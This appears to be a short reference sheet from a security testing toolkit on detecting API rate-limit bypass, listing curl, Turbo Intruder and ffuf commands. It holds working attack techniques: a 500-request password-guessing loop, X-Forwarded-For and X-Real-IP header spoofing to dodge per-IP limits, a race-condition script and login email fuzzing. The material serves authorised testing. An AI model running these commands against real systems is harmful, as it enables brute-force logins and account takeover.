<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
<!-- CIPHER is a trademark of defconxt. -->
# API Reference — Detecting API Rate Limit Bypass

## curl — Rate Limit Probing
```bash
# Baseline threshold test
for i in $(seq 1 500); do
  curl -s -o /dev/null -w "%{http_code}\n" -X POST URL \
    -H "Content-Type: application/json" -d '{"user":"test","pass":"wrong'$i'"}'
done

# Check rate limit response headers
curl -si URL | grep -iE 'x-rate|retry-after|x-ratelimit'

# Header rotation bypass
curl -s -H "X-Forwarded-For: 10.0.0.1" -X POST URL -d '{}'
curl -s -H "X-Real-IP: 10.0.0.2" -X POST URL -d '{}'
```

## Turbo Intruder — Race Condition
```python
# Single-packet attack for HTTP/2 race conditions
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1,
                           engine=Engine.BURP2)
    for i in range(50):
        engine.queue(target.req, gate='race')
    engine.openGate('race')
```

## ffuf — Distributed Fuzzing
```bash
ffuf -u URL -X POST -d '{"email":"FUZZ","pass":"test"}' \
  -w emails.txt -mc all -fc 429 -rate 100
```
